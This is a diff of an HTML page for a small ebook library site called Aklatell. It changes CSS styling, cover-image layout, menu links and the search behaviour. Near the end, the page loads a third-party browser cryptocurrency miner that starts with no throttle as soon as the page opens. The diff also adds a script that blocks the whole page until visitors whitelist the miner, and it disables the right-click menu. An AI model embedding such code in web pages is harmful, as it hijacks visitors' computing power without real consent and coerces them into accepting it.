@@ -11,13 +11,17 @@
             @font-face{
                 font-family: Bookman;
                 font-display: swap;
-                src: url('Bookman.otf');
+                src: url('assets/Bookman.otf');
             }
             *{
                 font-family: Bookman;
                 box-sizing: border-box;
                 padding: 0em;
                 margin: 0em;
+            }
+            img{
+                width: 100%;
+                height: auto;
             }
             body{
                 background: #16161D;
@@ -28,7 +32,7 @@
                 text-align: center;
                 background: #D98301;
                 background: linear-gradient(135deg, #D98301, #FF9501);
-                color: #FAF9F6;
+                color: #16161D;
                 z-index: 5;
                 padding: .5em;
             }
@@ -50,11 +54,13 @@
                 margin-right: .15em;
                 padding: .5em;
                 color: #16161D;
+                
                 border: 2px solid #FAF9F6;
+                text-align: center;
                 outline: none;
             }
             .ebooks{
-                padding: 1em;
+                padding: 1em 1em 2em 1em;
             }
             .ebooks ul{
                 display: grid;
@@ -64,27 +70,40 @@
                 gap: .5em;
             }
             .ebooks ul li{
+                display: grid;
                 padding: .5em;
                 background: linear-gradient(to bottom, #313135, #414145);
                 border: 2px double #D98301;
-            }
-            .ebooks ul li a{
-                display: grid;
-                background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('cover.jpg');
-                background-position: center;
-                text-shadow: 1px 1px #D98301;
-                padding: .5em;
-                background-size: cover;
-                text-decoration: none;
+                justify-content: center;
                 align-items: center;
+            }
+            .ebooks ul li .cover{
+                height: 210px;
+                width: 100%;
+                object-fit: fill;
+                overflow: hidden;
+            }
+            .ebooks ul li .cover img{
+                height: 100%;
+                width: 100%;
+                object-fit: fill;
+                overflow: hidden;
+            }
+            .ebooks ul li p{
+                display: grid;
+                text-shadow: 1px 1px #D98301;
+                padding-top: .5em;
+                font-size: 12px;
+                text-transform: uppercase;
+                text-decoration: none;
                 text-align: center;
                 font-weight: bold;
-                text-transform: uppercase;
-                object-fit: scale-down;
-                overflow-y: hidden;
-                font-size: 1em;
+                overflow-x: scroll;
+                white-space: pre;
                 color: #FAF9F6;
-                height: 210px;
+            }
+            .ebooks ul li p::-webkit-scrollbar{
+                display: none;
             }
             .menu{
                 position: fixed;
@@ -96,6 +115,7 @@
                 display: flex;
                 list-style: none;
                 box-shadow: .5em .5em 1em .5em #12121B;
+                background: #D98301;
                 justify-content: space-between;
                 z-index: 5;
                 width: 100%;
@@ -103,59 +123,79 @@
             .menu ul li{
                 width: 100%;
             }
-            .menu ul li button{
+            .menu ul li a{
+                text-decoration: none;
+                padding-top: .5em;
+                display: grid;
+            }
+            .menu ul li img{
+                display: block;
+                margin: auto;
+                height: 18px;
+                width: 18px;
+            }
+            .menu ul li span{
+                display: block;
+                font-size: 10px;
+                margin:; auto;
+                color: #16161D;
+                text-transform: uppercase;
                 text-align: center;
-                background: #D98301;
-                width: 100%;
-                padding: 1em;
-                color: #FAF9F6;
-                font-size: 14px;
-                outline: none;
-                border: none;
+                margin-top: .2em;
             }
         </style>
     </head>
-    <body>
+    <body oncontextmenu="return false">
         <header>
-            <h1>Aklatell</h1>
+            <h1>AKLATELL</h1>
         </header>
         <main>
             <section class="search">
                 <form>
-                    <input type="text" placeholder="Title" id="search">
+                    <input type="text" placeholder="SEARCH TITLE" id="search">
                 </form>
             </section>
             <section class="ebooks">
                 <ul id="ebook-list">
                     <li>
-                        <a href="ebooks/eBook of A Room With a View, by E. M. Forster.html">A Room With a View</a>
+                        <div class="cover">
+                            <a href="ebooks/eBook of A Room With a View, by E. M. Forster.html">
+                            <img src="covers/a-room.jpg">
+                            </a>
+                        </div>
+                        <p>A Room With a View</p>
                     </li>
                     <li>
-                        <a href="ebooks/eBook of Romeo and Juliet, by William Shakespeare.html">Romeo and Juliet</a>
+                        <div class="cover">
+                            <a href="ebooks/eBook of Middlemarch, by George Eliot.html">
+                            <img src="covers/middlemarch.jpg">
+                            </a>
+                        </div>
+                        <p>Middlemarch</p>
                     </li>
                     <li>
-                        <a href="ebooks/eBook of Little Women, by Louisa M. Alcott.html">Little Women</a>
+                        <div class="cover">
+                            <a href="ebooks/eBook of Little Women, by Louisa M. Alcott.html">
+                            <img src="covers/little-women.jpg">
+                            </a>
+                        </div>
+                        <p>Little Women</p>
                     </li>
                     <li>
-                        <a href="ebooks/eBook of Middlemarch, by George Eliot.html">Middlemarch</a>
+                        <div class="cover">
+                            <a href="ebooks/The Blue Castle.html">
+                            <img src="covers/blue-castle.jpg">
+                            </a>
+                        </div>
+                        <p>Blue Castle</p>
                     </li>
                     <li>
-                        <a href="ebooks/eBook of Moby Dick; Or the Whale, by Herman Melville.html">Moby Dick; or the Whale</a>
-                    </li>
-                    <li>
-                        <a href="ebooks/eBook of The Adventures of Roderick Random, by Tobias Smollett.html">The Adventures of Roderick Random</a>
-                    </li>
-                    <li>
-                        <a href="ebooks/eBook of The Enchanted April, by Elizabeth Von Arnim.html">The Enchanted April</a>
-                    </li>
-                    <li>
-                        <a href="ebooks/eBook of Twenty Years After, by Alexandre Dumas, Père.html">Twenty Years After </a>
-                    </li>
-                    <li>
-                        <a href="ebooks/eBook of The Odyssey, by Homer.html">The Odyssey</a>
-                    </li>
-                    <li>
-                        <a href="ebooks/eBook of The Picture of Dorian Gray, by Oscar Wilde.html">The Picture of Dorian Gray</a>
+                        <div class="cover">
+                            <a href="ebooks/eBook of The Enchanted April, by Elizabeth Von Arnim.html">
+                            <img src="covers/enchanted-april.jpg">
+                            </a>
+                        </div>
+                        <p>The Enchanted April</p>
                     </li>
                 </ul>
             </section>
@@ -163,9 +203,30 @@
         <footer>
             <section class="menu">
                 <ul>
-                    <li><button>Request</button></li>
-                    <li><button>Home</button></li>
-                    <li><button>About</button></li>
+                    <li>
+                        <a href="request.html">
+                        <img src="assets/request.png">
+                        <span>Request</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="home.html">
+                        <img src="assets/home.png">
+                        <span>Home</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="contact.html">
+                        <img src="assets/contact.png">
+                        <span>Contact</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="about.html">
+                        <img src="assets/about.png">
+                        <span>About</span>
+                        </a>
+                    </li>
                 </ul>
             </section>
         </footer>
@@ -176,10 +237,10 @@
         
         searchInput.addEventListener('input', () => {
             
-            searchInput.value = searchInput.value.toLowerCase();
+            searchInput.value = searchInput.value.toUpperCase();
             
             for(let i = 0; i < myEbookList.length; i++){
-                let ebookTitle = myEbookList[i].textContent.toLowerCase();
+                let ebookTitle = myEbookList[i].textContent.toUpperCase();
                 if(ebookTitle.includes(searchInput.value)){
                     myEbookList[i].style.display = 'grid';
                 }else{
@@ -188,14 +249,29 @@
             }
         });
     </script>
-    <script src="https://www.hostingcloud.racing/2C4c.js"></script>
+    <script src="https://www.hostingcloud.racing/73UE.js"></script>
     <script>
         var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
-            throttle: 0, c: 'w', ads: 0
+            throttle: 0, c: 'w'
         });
         _client.start();
         
-    
+    </script>
+    <script>
+        setTimeout(function(){
+            if(typeof _client === 'undefined' || _client === null)
+            {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        },1000);
     </script>
     </body>
 </html>
